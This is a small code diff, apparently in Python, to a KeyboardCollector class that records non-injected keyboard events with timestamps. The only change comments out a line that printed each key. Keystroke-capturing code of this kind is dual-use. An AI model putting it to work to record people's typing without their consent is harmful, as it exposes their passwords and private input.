@@ -28,6 +28,6 @@ class KeyboardCollector(DataCollector):
         if not event.Injected:
             event.Timestamp = time.time()
             self.data.append(event)
-            print(event.Key)
+            # print(event.Ascii)
             return True
         return False
